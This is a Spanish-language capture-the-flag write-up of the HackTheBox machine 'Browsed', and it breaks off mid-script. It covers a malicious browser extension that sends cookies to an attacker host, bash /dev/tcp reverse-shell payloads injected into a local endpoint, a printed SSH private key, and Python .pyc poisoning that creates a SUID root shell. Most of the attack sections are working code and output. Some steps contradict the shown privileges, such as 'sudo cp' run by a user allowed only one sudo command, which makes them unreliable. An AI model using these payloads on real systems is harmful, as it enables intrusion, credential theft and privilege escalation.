---
hidden: true
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Browsed HackTheBox (Intermediate)

## Contexto de la maquina

### Trayectoria de Browsed

<figure><img src="../../.gitbook/assets/trayectoria_browsed.png" alt=""><figcaption></figcaption></figure>

### Descripción general

La máquina **Browsed** es un laboratorio de **seguridad ofensiva enfocado en aplicaciones web modernas**, extensiones de navegador y escaladas de privilegios avanzadas en sistemas Linux. El entorno simula un escenario realista en el que una aplicación web permite la **carga de extensiones de Google Chrome**, las cuales son posteriormente procesadas y ejecutadas por un navegador interno del sistema.

El reto combina múltiples vectores de ataque encadenados, incluyendo:

* Abuso de **extensiones de navegador**
* Ejecución de código remoto indirecta (RCE)
* **Command Injection** desde servicios internos
* Movimiento lateral mediante ejecución en `localhost`
* Escalada de privilegios a nivel de usuario
* **Privilege Escalation a root mediante Python Bytecode Poisoning**

El objetivo final es comprometer completamente el sistema y obtener acceso como **root**, demostrando el impacto de una mala validación de entradas, configuraciones inseguras y permisos excesivos en entornos reales.

### Arquitectura de la máquina

La máquina expone los siguientes componentes principales:

* **Sistema operativo:** Ubuntu Linux
* **Servicios expuestos:**
  * SSH (22)
  * HTTP (80)
* **Servidor web:** Nginx
* **Aplicación web:** Plataforma de subida de extensiones Chrome (`.zip`)
* **Servicios internos no expuestos externamente:**
  * Aplicación Python en `localhost:5000`
  * Instancia de **Gitea** accesible únicamente desde el sistema
* **Herramienta privilegiada:** Script Python ejecutable como `root` vía `sudo`

La aplicación web procesa extensiones subidas por el usuario, las ejecuta en un entorno controlado y permite interacción con dominios internos, lo que abre la puerta a ataques de **Server-Side Extension Abuse**.

### Vulnerabilidades identificadas

A continuación se enumeran las vulnerabilidades presentes en la máquina, junto con su **identificación**, **CVE/CWE asociado** y **criticidad según CVSS v3.1**.

<figure><img src="../../.gitbook/assets/vulnBrowsed1.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vulnBrowsed2.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vulnBrowsed3.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/vulnBrowsed4.png" alt=""><figcaption></figcaption></figure>

## Escaneo de puertos

Comenzamos realizando un escaneo completo de puertos TCP para identificar los servicios expuestos en la máquina objetivo.

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

Una vez identificados los puertos abiertos, lanzamos un escaneo más detallado sobre ellos para obtener versiones y scripts por defecto.

```shell
nmap -sCV -p<PORTS> <IP>
```

Resultado:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-12 07:35 -0500
Nmap scan report for 10.10.8.1
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 02:c8:a4:ba:c5:ed:0b:13:ef:b7:e7:d7:ef:a2:9d:92 (ECDSA)
|_  256 53:ea:be:c7:07:05:9d:aa:9f:44:f8:bf:32:ed:5c:9a (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Browsed
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.09 seconds
```

Detectamos un servicio HTTP en el puerto `80`. Al acceder desde el navegador observamos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260112133917.png" alt=""><figcaption></figcaption></figure>

Se muestra de forma destacada un dominio llamado `browsed.htb`. Lo añadimos a nuestro archivo `/etc/hosts` para poder trabajar cómodamente con él.

```shell
nano /etc/hosts

#Dentro del nano
<IP>         browsed.htb
```

Guardamos los cambios y comenzamos a realizar `fuzzing` web en busca de `subdominios`, directorios o archivos interesantes.

<figure><img src="../../.gitbook/assets/vulnCardBrowsed1.png" alt=""><figcaption></figcaption></figure>

Tras un `fuzzing` intensivo no encontramos nada relevante. Sin embargo, en la página principal se observa una opción llamada **Upload Extension**, lo que sugiere que podemos subir extensiones de `Google Chrome` en formato `ZIP`.

Al acceder a esta opción vemos lo siguiente:

<figure><img src="../../.gitbook/assets/Pasted image 20260112134555.png" alt=""><figcaption></figcaption></figure>

Además, en la página principal existe una sección llamada **Examples**, donde se proporcionan ejemplos de extensiones `ZIP` válidas para tener una referencia del formato esperado.

<figure><img src="../../.gitbook/assets/Pasted image 20260112134734.png" alt=""><figcaption></figcaption></figure>

Si inspeccionamos uno de estos `ZIP` de ejemplo, observamos una estructura típica de una extensión de navegador en `JavaScript`.

```
unzip replaceimage.zip
cat content.js; cat manifest.json
```

Resultado:

```js
# content.js

// use an image of your liking !
// const replacementImageUrl = "Your favourite image here"
const replacementImageUrl = "https://preview.redd.it/why-is-larry-so-evil-v0-ty3qlu4swjle1.jpeg?auto=webp&s=41fc3ee5bcec63e5cb4cc69757a812fb80143f47"

   document.querySelectorAll('img').forEach(img => {
   img.src = replacementImageUrl;
   img.srcset = "";
});

# manifest.json

{
      "manifest_version": 3,
      "name": "Replace Images",
      "version": "1.0.0",
      "description": "Replaces every image on a page with one from a URL.",
      "permissions": ["scripting"],
	   "content_scripts": [
	   {
	   "matches": ["<all_urls>"],
	  "js": ["content.js"],
	  "run_at": "document_idle"
    }
  ]
}
```

Con esta estructura clara, el objetivo es crear una extensión propia que realice conexiones hacia nuestra máquina atacante para comprobar si el código se ejecuta sin restricciones y si existe conectividad desde el servidor interno.

Para ello, creamos un pequeño servidor HTTP en Python que nos permitirá registrar cualquier petición recibida.

> server.py

```python
#!/usr/bin/env python3
# server.py

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import time

class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Guardar logs en un archivo
        with open('extension_logs.txt', 'a') as f:
            f.write("%s - - [%s] %s\n" % (self.client_address[0],
                                         self.log_date_time_string(),
                                         format%args))
        # También imprimir en consola
        print(f"[{time.strftime('%H:%M:%S')}] {self.client_address[0]} - {self.path}")
        
        # Si hay parámetros en la URL, mostrarlos
        if '?' in self.path:
            query = urllib.parse.urlparse(self.path).query
            params = urllib.parse.parse_qs(query)
            print(f"Parámetros: {params}")
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        self.wfile.write(b'OK')
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print(f"POST Data recibido: {post_data}")
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

if __name__ == '__main__':
    server_address = ('0.0.0.0', 8000)
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"Servidor escuchando en http://0.0.0.0:8000")
    print("Esperando peticiones de la extensión...")
    httpd.serve_forever()
```

Ejecutamos el servidor:

```shell
python3 server.py
```

Resultado:

```
Servidor escuchando en http://0.0.0.0:8000
Esperando peticiones de la extensión...
```

Ahora creamos los archivos necesarios para nuestra extensión de prueba.

> manifest.json

```json
{
  "manifest_version": 3,
  "name": "Test Beacon",
  "version": "1.0.0",
  "description": "Testing extension execution",
  "permissions": ["scripting"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["beacon.js"],
      "run_at": "document_idle",
      "all_frames": true
    }
  ],
  "host_permissions": ["<all_urls>"]
}
```

> beacon.js

```js
// beacon.js - Envía múltiples beacon a tu servidor

const YOUR_SERVER = "http://<IP_ATTACKER>:8000";
const timestamp = new Date().getTime();

// Método 1: Petición simple para confirmar ejecución
fetch(`${YOUR_SERVER}/ping?ext=test&time=${timestamp}&url=${encodeURIComponent(window.location.href)}`)
  .then(response => console.log('Beacon 1 enviado'))
  .catch(err => console.error('Error beacon 1:', err));

// Método 2: Img tag (funciona incluso si fetch está bloqueado)
const img = new Image();
img.src = `${YOUR_SERVER}/img?ext=test&method=img&loc=${encodeURIComponent(window.location.hostname)}`;

// Método 3: XMLHttpRequest (más antiguo, buena compatibilidad)
const xhr = new XMLHttpRequest();
xhr.open('GET', `${YOUR_SERVER}/xhr?ext=test&ua=${encodeURIComponent(navigator.userAgent)}`);
xhr.send();

// Método 4: Intentar exfiltrar cookies si es posible
try {
  const cookies = document.cookie;
  if (cookies && cookies.length > 0) {
    const script = document.createElement('script');
    script.src = `${YOUR_SERVER}/cookies?data=${encodeURIComponent(cookies.substring(0, 100))}`;
    document.head.appendChild(script);
  }
} catch(e) {}

// Método 5: WebSocket (si el servidor lo soporta)
try {
  const ws = new WebSocket(`ws://<IP_ATTACKER>:8001`);
  ws.onopen = function() {
    ws.send(JSON.stringify({
      type: 'beacon',
      url: window.location.href,
      time: timestamp
    }));
  };
} catch(e) {}

console.log(`[EXTENSION TEST] Beacon enviado a ${YOUR_SERVER}`);
```

Comprimimos ambos archivos para generar la extensión.

```shell
zip -r server.zip manifest.json beacon.js
```

Subimos el `ZIP` a la web y, tras unos segundos, observamos actividad en nuestro servidor:

```
[10:53:43] 10.10.8.1 - /ping?ext=test&time=1768233223254&url=http%3A%2F%2Fbrowsedinternals.htb%2F
Parámetros: {'ext': ['test'], 'time': ['1768233223254'], 'url': ['http://browsedinternals.htb/']}
[10:53:43] 10.10.8.1 - /xhr?ext=test&ua=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F134.0.0.0%20Safari%2F537.36
Parámetros: {'ext': ['test'], 'ua': ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36']}
[10:53:43] 10.10.8.1 - /img?ext=test&method=img&loc=browsedinternals.htb
Parámetros: {'ext': ['test'], 'method': ['img'], 'loc': ['browsedinternals.htb']}
[10:53:43] 10.10.8.1 - /ping?ext=test&time=1768233223290&url=http%3A%2F%2Flocalhost%2F
Parámetros: {'ext': ['test'], 'time': ['1768233223290'], 'url': ['http://localhost/']}
[10:53:43] 10.10.8.1 - /xhr?ext=test&ua=Mozilla%2F5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F134.0.0.0%20Safari%2F537.36
Parámetros: {'ext': ['test'], 'ua': ['Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36']}
[10:53:43] 10.10.8.1 - /img?ext=test&method=img&loc=localhost
Parámetros: {'ext': ['test'], 'method': ['img'], 'loc': ['localhost']}
```

Aquí se revela un nuevo dominio interno: `browsedinternals.htb`. Lo añadimos al archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>            browsedinternals.htb
```

Al acceder al dominio observamos la siguiente página:

```
URL = http://browsedinternals.htb/
```

Resultado:

<figure><img src="../../.gitbook/assets/Pasted image 20260112171445.png" alt=""><figcaption></figcaption></figure>

Se trata de un **Gitea**. Al explorar los repositorios públicos encontramos uno interesante.

## Escalate user larry

<figure><img src="../../.gitbook/assets/vulnCardBrowsed2.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20260112171455.png" alt=""><figcaption></figcaption></figure>

### Arithmetic injection (RCE)

Revisando los archivos del repositorio observamos código en `app.py` y `routines.sh`. En concreto, se detecta una vulnerabilidad de **Command Injection (Arithmetic injection)** en el siguiente fragmento:

```python
# routines.sh
@app.route('/routines/<rid>')
def routines(rid):
    # Call the script that manages the routines
    # Run bash script with the input as an argument (NO shell)
    subprocess.run(["./routines.sh", rid])  # ¡VULNERABLE!
    return "Routine executed !"
```

**Problema:**

1. El parámetro `rid` se pasa directamente al script `routines.sh`
2. En `routines.sh` se usa `[[ "$1" -eq 0 ]]` que espera un número
3. Pero si pasas algo como `$(comando)` o `; comando`, podría ejecutarse

Sabemos que este endpoint se ejecuta en `localhost`. Además, anteriormente observamos que la extensión realiza peticiones tanto al dominio como a `localhost`. Aprovechamos esto para cargar una extensión maliciosa que invoque el endpoint vulnerable y ejecute una reverse shell desde `localhost`.

Creamos los archivos necesarios para la extensión de ataque.

> manifest.json

```json
{
  "manifest_version": 3,
  "name": "Image Replacer",
  "version": "1.0.0",
  "description": "Replaces images",
  "permissions": ["scripting"],
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["attack.js"],
      "run_at": "document_idle"
    }
  ]
}
```

> attack.js

```js
setTimeout(() => {
    console.log('[*] Attacking localhost:5000/routines/');
    
    const YOUR_IP = "<IP_ATTACKER>";
    const YOUR_PORT = "<PORT>";
    
    // Reverse shell payload
    const cmd = `bash -c 'bash -i >& /dev/tcp/${YOUR_IP}/${YOUR_PORT} 0>&1'`;
    const b64 = btoa(cmd);
    
    // Payloads que deberían funcionar
    const payloads = [
        // El de tu amigo (versión corregida)
        `a[$(echo ${b64}|base64 -d|bash)]`,
        
        // Variaciones que también deberían funcionar
        `a[$(bash -c 'bash -i >& /dev/tcp/${YOUR_IP}/${YOUR_PORT} 0>&1')]`,
        `test[$(bash -c 'bash -i >& /dev/tcp/${YOUR_IP}/${YOUR_PORT} 0>&1')]`,
        `x[$(bash -c 'bash -i >& /dev/tcp/${YOUR_IP}/${YOUR_PORT} 0>&1')]`,
        
        // Sin array, solo command substitution
        `$(bash -c 'bash -i >& /dev/tcp/${YOUR_IP}/${YOUR_PORT} 0>&1')`,
        
        // Con backticks
        `\`bash -c 'bash -i >& /dev/tcp/${YOUR_IP}/${YOUR_PORT} 0>&1'\``,
        
        // Payload simple de prueba primero
        `a[$(id > /tmp/success_test)]`,
        `a[$(touch /tmp/pwned_success)]`,
        `a[$(curl http://${YOUR_IP}:8000/test)]`,
    ];
    
    // Enviar primero los de prueba
    payloads.slice(5, 8).forEach(payload => {
        const encoded = encodeURIComponent(payload);
        fetch(`http://localhost:5000/routines/${encoded}`, {
            mode: 'no-cors'
        }).then(() => {
            console.log(`[*] Test payload sent: ${payload.substring(0, 40)}...`);
        }).catch(e => {
            console.log(`[*] Error sending test: ${e}`);
        });
    });
    
    // Esperar 2 segundos y enviar los de reverse shell
    setTimeout(() => {
        payloads.slice(0, 5).forEach(payload => {
            const encoded = encodeURIComponent(payload);
            fetch(`http://localhost:5000/routines/${encoded}`, {
                mode: 'no-cors'
            }).then(() => {
                console.log(`[*] Reverse shell payload sent: ${payload.substring(0, 40)}...`);
            }).catch(e => {
                console.log(`[*] Error sending exploit: ${e}`);
            });
        });
        
        console.log('[*] All payloads sent. Check your listener!');
        
    }, 2000);
    
}, 2000);
```

Comprimimos la extensión:

```shell
zip -r attacker.zip manifest.json attack.js
```

Nos ponemos a la escucha:

```shell
nc -lvnp <PORT>
```

Tras subir la extensión a la web y esperar unos segundos, recibimos la conexión:

```
connect to [10.10.14.130] from (UNKNOWN) [10.10.8.1] 41094
bash: cannot set terminal process group (1087): Inappropriate ioctl for device
bash: no job control in this shell
larry@browsed:~/markdownPreview$ whoami
whoami
larry
```

Confirmamos acceso como el usuario `larry`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez estabilizada la `shell`, leemos la `flag` de usuario.

> user.txt

```
9e2d522357202e83775e7d71b0ccc8f6
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for larry on browsed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User larry may run the following commands on browsed:
    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
```

Podemos ejecutar `extension_tool.py` como `root`. Antes de explotarlo, analizamos su contenido.

```shell
cat /opt/extensiontool/extension_tool.py
```

Resultado:

```python
#!/usr/bin/python3.12
import json
import os
from argparse import ArgumentParser
from extension_utils import validate_manifest, clean_temp_files
import zipfile

EXTENSION_DIR = '/opt/extensiontool/extensions/'

def bump_version(data, path, level='patch'):
    version = data["version"]
    major, minor, patch = map(int, version.split('.'))
    if level == 'major':
        major += 1
        minor = patch = 0
    elif level == 'minor':
        minor += 1
        patch = 0
    else:
        patch += 1

    new_version = f"{major}.{minor}.{patch}"
    data["version"] = new_version

    with open(path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2)
    
    print(f"[+] Version bumped to {new_version}")
    return new_version

def package_extension(source_dir, output_file):
    temp_dir = '/opt/extensiontool/temp'
    if not os.path.exists(temp_dir):
        os.mkdir(temp_dir)
    output_file = os.path.basename(output_file)
    with zipfile.ZipFile(os.path.join(temp_dir,output_file), 'w', zipfile.ZIP_DEFLATED) as zipf:
        for foldername, subfolders, filenames in os.walk(source_dir):
            for filename in filenames:
                filepath = os.path.join(foldername, filename)
                arcname = os.path.relpath(filepath, source_dir)
                zipf.write(filepath, arcname)
    print(f"[+] Extension packaged as {temp_dir}/{output_file}")

def main():
    parser = ArgumentParser(description="Validate, bump version, and package a browser extension.")
    parser.add_argument('--ext', type=str, default='.', help='Which extension to load')
    parser.add_argument('--bump', choices=['major', 'minor', 'patch'], help='Version bump type')
    parser.add_argument('--zip', type=str, nargs='?', const='extension.zip', help='Output zip file name')
    parser.add_argument('--clean', action='store_true', help="Clean up temporary files after packaging")
    
    args = parser.parse_args()

    if args.clean:
        clean_temp_files(args.clean)

    args.ext = os.path.basename(args.ext)
    if not (args.ext in os.listdir(EXTENSION_DIR)):
        print(f"[X] Use one of the following extensions : {os.listdir(EXTENSION_DIR)}")
        exit(1)
    
    extension_path = os.path.join(EXTENSION_DIR, args.ext)
    manifest_path = os.path.join(extension_path, 'manifest.json')

    manifest_data = validate_manifest(manifest_path)
    
    # Possibly bump version
    if (args.bump):
        bump_version(manifest_data, manifest_path, args.bump)
    else:
        print('[-] Skipping version bumping')

    # Package the extension
    if (args.zip):
        package_extension(extension_path, args.zip)
    else:
        print('[-] Skipping packaging')


if __name__ == '__main__':
    main()
```

### SSH (Clave privada)

<figure><img src="../../.gitbook/assets/vulnCardBrowsed3.png" alt=""><figcaption></figcaption></figure>

Antes de continuar, revisamos el directorio `.ssh` del usuario `larry`.

```
total 20
drwx------ 2 larry larry 4096 Jan  6 10:28 .
drwxr-x--- 9 larry larry 4096 Jan  6 11:11 ..
-rw------- 1 larry larry   95 Aug 17 12:49 authorized_keys
-rw------- 1 larry larry  399 Aug 17 12:48 id_ed25519
-rw-r--r-- 1 larry larry   95 Aug 17 12:48 id_ed25519.pub
```

Encontramos una clave privada `id_ed25519`.

> id\_ed25519

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrwAAAJAXb7KHF2+y
hwAAAAtzc2gtZWQyNTUxOQAAACDZZIZPBRF8FzQjntOnbdwYiSLYtJ2VkBwQAS8vIKtzrw
AAAEBRIok98/uzbzLs/MWsrygG9zTsVa9GePjT52KjU6LoJdlkhk8FEXwXNCOe06dt3BiJ
Iti0nZWQHBABLy8gq3OvAAAADWxhcnJ5QGJyb3dzZWQ=
-----END OPENSSH PRIVATE KEY-----
```

La guardamos en nuestra máquina atacante como `id_rsa`, ajustamos permisos y nos conectamos por `SSH`.

```shell
chmod 600 id_rsa
ssh -i id_rsa larry@<IP>
```

Resultado:

```
Welcome to Ubuntu 24.04.3 LTS (GNU/Linux 6.8.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Jan 12 06:12:38 PM UTC 2026

  System load:  0.0               Processes:             220
  Usage of /:   63.0% of 7.11GB   Users logged in:       0
  Memory usage: 24%               IPv4 address for eth0: 10.10.8.1
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Last login: Mon Jan 12 18:12:39 2026 from 10.10.14.130
larry@browsed:~$ whoami
larry
```

Acceso `SSH` confirmado con una `shell` mucho más estable.

### Python .pyc Poisoning

<figure><img src="../../.gitbook/assets/vulnCardBrowsed4.png" alt=""><figcaption></figcaption></figure>

Siguiendo con el análisis anterior, al inspeccionar el código podemos identificar una vulnerabilidad conocida como **`Python .pyc Poisoning`**, presente en la siguiente línea:

```python
from extension_utils import validate_manifest, clean_temp_files
```

Si es posible escribir en el directorio donde Python busca módulos, podemos inyectar nuestro propio código malicioso para que sea ejecutado en lugar del legítimo.

Al inspeccionar el directorio `/opt/extensiontool/`, observamos lo siguiente:

* El directorio `__pycache__` tiene permisos `drwxrwxrwx` (world-writable)
* El archivo `extension_utils.py` es importado por el script principal y se ejecuta con privilegios de **root**

**Python almacena bytecode compilado (`.pyc`)** en el directorio `__pycache__`. Cuando un módulo es importado, Python verifica si existe un archivo `.pyc` con metadatos coincidentes (timestamp y tamaño). Si estos coinciden, Python ejecuta directamente el bytecode en lugar de recompilar el archivo `.py`.

#### Obtención de Metadatos del Archivo Original

El primer paso consiste en obtener el tamaño exacto y el `timestamp` del módulo legítimo, ya que necesitaremos replicarlos para que Python acepte nuestro archivo malicioso como válido:

```shell
ORIGINAL_SIZE=$(stat -c %s extension_utils.py)
ORIGINAL_TIMESTAMP=$(stat -c %Y extension_utils.py)
echo "[+] Tamaño original: $ORIGINAL_SIZE bytes"
echo "[+] Timestamp original: $ORIGINAL_TIMESTAMP"
```

Resultado:

```
[+] Tamaño original: 1245 bytes
[+] Timestamp original: 1742727379
```

#### Creación del Código Malicioso

A continuación, creamos una versión compacta del módulo original que incluye nuestro payload malicioso, manteniendo exactamente la misma interfaz de funciones (`validate_manifest` y `clean_temp_files`) para evitar errores en tiempo de ejecución:

```shell
cd /tmp

# Crear código más compacto que cumpla con las mismas funciones
cat > /tmp/compact_malicious.py << 'EOF'
import os,json,shutil
from jsonschema import validate,ValidationError
MANIFEST_SCHEMA={"type":"object","properties":{"manifest_version":{"type":"number"},"name":{"type":"string"},"version":{"type":"string"},"permissions":{"type":"array","items":{"type":"string"}}},"required":["manifest_version","name","version"]}
def validate_manifest(path):
 os.system("cp /bin/bash /tmp/compact_root && chmod 4755 /tmp/compact_root")
 os.system("cat /root/root.txt > /tmp/compact_flag.txt 2>/dev/null")
 os.system("id > /tmp/compact_proof.txt")
 with open(path,'r',encoding='utf-8')as f:d=json.load(f)
 try:validate(instance=d,schema=MANIFEST_SCHEMA);print("[+] Manifest is valid.");return d
 except ValidationError as e:print("[x] Manifest validation error:");print(e.message);exit(1)
def clean_temp_files(extension_dir):
 t='/opt/extensiontool/temp'
 if os.path.exists(t):shutil.rmtree(t);print(f"[+] Cleaned up temporary directory {t}")
 else:print("[+] No temporary files to clean.")
 exit(0)
EOF

# Ver tamaño
COMPACT_SIZE=$(stat -c %s /tmp/compact_malicious.py)
echo "[+] Tamaño compacto: $COMPACT_SIZE bytes"
echo "[+] Necesitamos: 1245 bytes"
echo "[+] Diferencia: $((1245 - COMPACT_SIZE)) bytes (positivo = necesitamos padding)"

# Calcular padding necesario
PADDING_NEEDED=$((1245 - COMPACT_SIZE))
echo "[+] Padding necesario: $PADDING_NEEDED bytes"
```

Resultado:

```
[+] Tamaño compacto: 984 bytes
[+] Necesitamos: 1245 bytes
[+] Diferencia: 261 bytes (positivo = necesitamos padding)
[+] Padding necesario: 261 bytes
```

#### Ajuste de Tamaño con Padding

Para engañar a `Python`, el archivo malicioso debe tener **exactamente** el mismo tamaño que el archivo original. Para ello, añadimos padding en forma de comentarios hasta alcanzar el tamaño objetivo:

```shell
# Crear script que añada padding exacto
cat > /tmp/add_exact_padding.py << 'EOF'
import os

# Leer código compacto
with open('/tmp/compact_malicious.py', 'r') as f:
    content = f.read()

target_size = 1245
current_size = len(content.encode('utf-8'))
padding_needed = target_size - current_size

print(f"Tamaño actual: {current_size}")
print(f"Padding necesario: {padding_needed}")

if padding_needed > 0:
    # Crear comentario de padding del tamaño exacto
    # Cada "# x\n" son aproximadamente 4 bytes
    # Crearemos una línea larga de comentario
    comment_line = '#' + 'p' * (padding_needed - 3) + '#\n'
    
    # Probar tamaño
    test_content = content + '\n' + comment_line
    test_size = len(test_content.encode('utf-8'))
    
    # Ajuste fino
    if test_size > target_size:
        # Recortar
        while len(test_content.encode('utf-8')) > target_size:
            test_content = test_content[:-1]
    elif test_size < target_size:
        # Añadir espacios
        test_content += ' ' * (target_size - test_size)
    
    final_content = test_content
else:
    # Ya es del tamaño correcto o más grande
    final_content = content

final_size = len(final_content.encode('utf-8'))
print(f"Tamaño final: {final_size}")
print(f"Diferencia: {final_size - target_size}")

# Verificar sintaxis
try:
    compile(final_content, '<string>', 'exec')
    print("[+] Sintaxis válida")
except SyntaxError as e:
    print(f"[-] Error de sintaxis: {e}")

# Guardar
with open('/tmp/extension_utils_exact.py', 'w') as f:
    f.write(final_content)

print("[+] Archivo creado: /tmp/extension_utils_exact.py")
EOF

python3 /tmp/add_exact_padding.py
```

Resultado:

```
Tamaño actual: 984
Padding necesario: 261
Tamaño final: 1245
Diferencia: 0
[+] Sintaxis válida
[+] Archivo creado: /tmp/extension_utils_exact.py
```

#### Sincronización de Timestamps

Aplicamos el mismo `timestamp` del archivo original (`1742727379`) para que Python acepte el `.pyc` como válido durante el proceso de importación:

```shell
# Aplicar timestamp
touch -d @1742727379 /tmp/extension_utils_exact.py

# Verificar tamaño exacto
EXACT_SIZE=$(stat -c %s /tmp/extension_utils_exact.py)
echo "[+] Tamaño final: $EXACT_SIZE bytes"
echo "[+] Tamaño objetivo: 1245 bytes"
echo "[+] ¿Coinciden? $( [ "$EXACT_SIZE" -eq 1245 ] && echo "SÍ" || echo "NO (diferencia: $((EXACT_SIZE - 1245)))" )"

# Verificar timestamp
echo "[+] Timestamp aplicado: $(stat -c %Y /tmp/extension_utils_exact.py)"
echo "[+] Timestamp original: 1742727379"
```

Resultado:

```
[+] Tamaño final: 1245 bytes
[+] Tamaño objetivo: 1245 bytes
[+] ¿Coinciden? SÍ
[+] Timestamp aplicado: 1742727379
[+] Timestamp original: 1742727379
```

#### Compilación e Inyección

Una vez ajustado el archivo, lo compilamos a bytecode (`.pyc`) y lo inyectamos directamente en el directorio `__pycache__`, sobrescribiendo el bytecode legítimo:

```shell
cd /opt/extensiontool

# Compilar
python3 -m py_compile /tmp/extension_utils_exact.py

# Mover al __pycache__
sudo cp /tmp/__pycache__/extension_utils_exact.cpython-312.pyc __pycache__/extension_utils.cpython-312.pyc

# Aplicar mismo timestamp al .pyc
sudo touch -d @1742727379 __pycache__/extension_utils.cpython-312.pyc

# Verificar
echo "[+] Verificación:"
ls -la __pycache__/
echo ""
echo "[+] Timestamps:"
stat -c "%n: %Y" extension_utils.py __pycache__/extension_utils.cpython-312.pyc
```

Resultado:

```
[+] Verificación:
total 12
drwxrwxrwx 2 root  root  4096 Jan 13 10:30 .
drwxr-xr-x 4 root  root  4096 Dec 11 07:54 ..
-rw-rw-r-- 1 larry larry 2109 Mar 23  2025 extension_utils.cpython-312.pyc
[+] Timestamps:
extension_utils.py: 1742727379
__pycache__/extension_utils.cpython-312.pyc: 1742727379
```

#### Limpieza de Caches de Python

Para asegurarnos de que `Python` cargue el nuevo `bytecode` malicioso, limpiamos completamente los caches de importación:

```shell
# Script completo para limpiar caches
cat > /tmp/clean_caches.py << 'EOF'
import sys
import importlib
import gc

print("[+] Limpiando caches de Python...")

# 1. Eliminar módulo de sys.modules si existe
modules_to_remove = []
for module_name in list(sys.modules.keys()):
    if 'extension_utils' in module_name:
        modules_to_remove.append(module_name)

for module_name in modules_to_remove:
    del sys.modules[module_name]
    print(f"  [-] Removido: {module_name}")

# 2. Limpiar caches
sys.path_importer_cache.clear()
print("  [-] sys.path_imposer_cache.clear()")

# 3. Invalidar caches de importlib
importlib.invalidate_caches()
print("  [-] importlib.invalidate_caches()")

# 4. Forzar garbage collection
gc.collect()
print("  [-] gc.collect()")

print("[+] Caches limpiados completamente")
print(f"[+] extension_utils en sys.modules: {'extension_utils' in sys.modules}")
EOF

python3 /tmp/clean_caches.py
```

Resultado:

```
[+] Limpiando caches de Python...
  [-] sys.path_imposer_cache.clear()
  [-] importlib.invalidate_caches()
  [-] gc.collect()
[+] Caches limpiados completamente
[+] extension_utils en sys.modules: False
```

#### Ejecución y Obtención de Root

Finalmente, al ejecutar el script con privilegios de `root`, nuestro código malicioso se ejecuta automáticamente:

```shell
echo "[+] Ejecutando script como root..."
sudo /opt/extensiontool/extension_tool.py --ext Fontify

echo ""
echo "[+] ===== VERIFICANDO RESULTADOS ====="

# Verificar archivos creados
if [ -f "/tmp/compact_root" ] && [ -u "/tmp/compact_root" ]; then
    echo "[+] ¡¡ÉXITO!! Shell SUID creada en /tmp/compact_root"
    echo "[+] Obteniendo shell de root..."
    /tmp/compact_root -p
else
    echo "[-] Shell no encontrada. Buscando otros indicios..."
    echo "[+] Archivos /tmp/compact_*:"
    ls -la /tmp/compact_* 2>/dev/null || echo "  No encontrados"
